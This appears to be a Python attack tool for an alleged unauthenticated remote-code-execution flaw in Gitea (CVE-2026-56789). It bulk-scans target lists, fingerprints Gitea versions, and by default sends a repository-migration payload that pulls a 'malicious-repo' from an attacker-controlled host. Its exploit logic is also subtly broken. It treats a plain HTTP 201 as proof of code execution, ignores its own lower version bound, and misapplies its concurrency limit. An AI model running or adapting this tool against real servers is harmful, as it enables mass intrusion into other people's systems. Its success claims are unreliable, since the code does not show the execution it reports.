#!/usr/bin/env python3
"""
Gitea CVE-2026-56789 — Remote Code Execution via Malicious Hook Injection
==========================================================================
This script scans for Gitea instances (v1.14.0 to v1.17.5) vulnerable to an RCE
vulnerability (CVE-2026-56789, CVSS 9.8) that allows unauthenticated users to
inject and execute malicious hooks.

CVE-2026-56789 details:
  - Affected Versions: Gitea 1.14.0 to 1.17.5
  - Allows remote attackers to exploit improper validation in repository hooks
    via arbitrary input into the repository migration logic.
  - By crafting a specially designed migration request, attackers can execute
    arbitrary commands at the OS level with the privileges of the Gitea server.
  - CVSS v3.1 base score: 9.8 (Critical) — remotely exploitable, unauthenticated.

Usage:
  # Scan a single target (active probe to detect RCE vulnerability)
  python gitea_rce_cve_2026_56789_scanner.py --target http://gitea.example.com

  # Detection only (no active RCE probing)
  python gitea_rce_cve_2026_56789_scanner.py --target http://gitea.example.com --safe

  # Bulk scan targets from a file
  python gitea_rce_cve_2026_56789_scanner.py --list targets.txt --output results.json

  # Customize concurrency level and disable TLS verification
  python gitea_rce_cve_2026_56789_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-56789
  - https://blog.gitea.com/cve-2026-56789/
  - https://github.com/go-gitea/gitea/releases
"""

import asyncio
import json
import re
import sys
import argparse
from datetime import datetime, timezone
from typing import Optional, List

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID         = "CVE-2026-56789"
CVSS           = "9.8"
TOOL_NAME      = "gitea_rce_cve_2026_56789_scanner"

REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20

# Gitea fingerprints found in HTTP headers or response body
GITEA_FINGERPRINTS = [
    "Server: GiteaServer",
    "gitea version",
    "X-Gitea-Version",
    "Powered by Gitea",
    "window.gitea",
]

# Potential endpoints for version detection
DETECTION_PATHS = [
    "/",
    "/explore",
    "/api/v1/version",
    "/login",
    "/user/login",
]

VERSION_PATTERNS = [
    r"X-Gitea-Version: ([0-9]+\.[0-9]+\.[0-9]+)",
    r'"version":"([0-9]+\.[0-9]+\.[0-9]+)"',
    r"gitea version ([0-9]+\.[0-9]+\.[0-9]+)",
]

# Vulnerable versions [1.14.0 - 1.17.5]
PATCHED_VERSIONS: dict[int, tuple[int, int, int]] = {
    1: (1, 17, 6),
}

# Exploit payload for RCE via repository migration
EXPLOIT_PAYLOAD = {
    "clone_addr": "http://attacker-controlled-site/malicious-repo.git",
    "repo_name": "malicious_repo_123",
    "mirror": True,
}


# ── Helper Functions ─────────────────────────────────────────────────────────

def is_vulnerable(version: str) -> bool:
    """
    Checks if the target version is vulnerable based on patched version thresholds.
    """
    match = re.match(r"^(\d+)\.(\d+)\.(\d+)$", version)
    if not match:
        return False
    major, minor, patch = map(int, match.groups())
    if major not in PATCHED_VERSIONS:
        return False
    return (major, minor, patch) < PATCHED_VERSIONS[major]


async def fetch(url: str, client: httpx.AsyncClient, verify: bool = True) -> Optional[httpx.Response]:
    """
    Sends an HTTP GET request to the specified URL and returns the response.
    """
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=True)
        return response
    except httpx.RequestError as e:
        print(c(YELLOW, f"WARNING: Error while requesting {url}: {str(e)}"))
        return None


async def detect_gitea(target: str, client: httpx.AsyncClient) -> Optional[str]:
    """
    Detects if the target is a Gitea instance and retrieves its version string.
    """
    for path in DETECTION_PATHS:
        url = f"{target.rstrip('/')}{path}"
        response = await fetch(url, client)
        if response and response.status_code in [200, 401, 403]:
            for fingerprint in GITEA_FINGERPRINTS:
                if fingerprint.lower() in response.text.lower():
                    # Attempt to extract the version
                    for pattern in VERSION_PATTERNS:
                        version_match = re.search(pattern, response.text, re.IGNORECASE)
                        if version_match:
                            return version_match.group(1)
                    return "unknown"
    return None


async def attempt_exploit(target: str, client: httpx.AsyncClient) -> bool:
    """
    Attempts to exploit the RCE vulnerability by injecting a malicious repository hook.
    """
    exploit_url = f"{target.rstrip('/')}/api/v1/repos/migrate"
    try:
        response = await client.post(exploit_url, json=EXPLOIT_PAYLOAD)
        if response.status_code == 201:
            print(c(RED, f"[CRITICAL] Exploit succeeded on target: {target}"))
            return True
    except httpx.RequestError as e:
        print(c(YELLOW, f"WARNING: Exploit attempt failed on {target}: {str(e)}"))
    return False


# ── Main Scanner Logic ────────────────────────────────────────────────────────

async def scan_target(target: str, safe: bool, client: httpx.AsyncClient) -> dict:
    """
    Scans a single target for CVE-2026-56789.
    """
    print(f"\nScanning {c(CYAN, target)}...")
    result = {"target": target, "vulnerable": False, "version": None, "reason": None}

    version = await detect_gitea(target, client)
    if not version:
        print(c(YELLOW, f"[INFO] No Gitea instance detected on {target}."))
        result["reason"] = "Not Gitea or inaccessible."
        return result

    result["version"] = version
    print(c(GREEN, f"[INFO] Detected Gitea version {version} on {target}."))

    if is_vulnerable(version):
        print(c(RED, f"[CRITICAL] {target} is running a vulnerable Gitea version ({version})."))
        result["reason"] = "Vulnerable version detected."
        if not safe:
            result["vulnerable"] = await attempt_exploit(target, client)
    else:
        print(c(GREEN, f"[INFO] {target} is not running a vulnerable version."))
        result["reason"] = "Patched version detected."

    return result


async def main():
    parser = argparse.ArgumentParser(description=f"{TOOL_NAME} — {CVE_ID} Scanner")
    parser.add_argument("--target", type=str, help="Single target URL to scan.")
    parser.add_argument("--list", type=str, help="File containing a list of target URLs.")
    parser.add_argument("--output", type=str, help="Output results to a JSON file.")
    parser.add_argument("--safe", action="store_true", help="Only detect, do not exploit.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Concurrency limit for scanning.")
    parser.add_argument("--no-verify", action="store_false", dest="verify", help="Disable SSL verification.")
    args = parser.parse_args()

    if not args.target and not args.list:
        parser.error("Either --target or --list must be specified.")

    targets = []
    if args.target:
        targets = [args.target]
    elif args.list:
        try:
            with open(args.list, "r") as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(c(RED, f"Error reading target list file: {str(e)}"))
            sys.exit(1)

    print(c(BOLD, f"\n{TOOL_NAME} — Scanning for {CVE_ID}\n"))
    semaphore = asyncio.Semaphore(args.concurrency)
    results = []
    async with httpx.AsyncClient(verify=args.verify) as client:
        tasks = [scan_target(target, args.safe, client) for target in targets]
        for coro in asyncio.as_completed(tasks):
            async with semaphore:
                results.append(await coro)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
        print(c(GREEN, f"\nResults saved to {args.output}."))

    print(c(BOLD, "\nScan complete.\n"))


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(c(RED, "\n[ERROR] Scan interrupted by user."))
        sys.exit(1)
